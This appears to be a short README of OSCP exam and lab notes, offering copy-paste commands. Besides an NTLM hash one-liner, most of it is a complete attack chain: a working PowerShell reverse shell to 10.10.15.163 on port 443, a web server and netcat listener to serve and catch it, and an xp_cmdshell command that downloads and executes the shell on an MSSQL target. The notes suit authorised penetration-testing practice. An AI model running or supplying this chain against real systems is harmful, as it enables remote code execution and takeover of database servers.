# OSCP Notes – Quick Snippets

This repository contains small, copy-paste ready commands and one-liners I frequently use during OSCP-style labs and exams.

> ⚠️ For educational purposes only.  
> Do not use these techniques on systems you do not own or have explicit permission to test.

---

## ⚡ Quick Snippets (Copy-Paste Ready)

### 🔐 Generate NTLM Hash from a Plain Password
```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
```
### Get shell in xp_cmdshell
> Create a powershell to connect the target.
```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.163",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > shell.ps1
```
>open a web server:
```bash
python3 -m http.server
```
>open the listener:
```bash
nc -lvnp 443
```
>in mssql cli, get the shell file:
```bash
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.163/shell.ps1')"
```
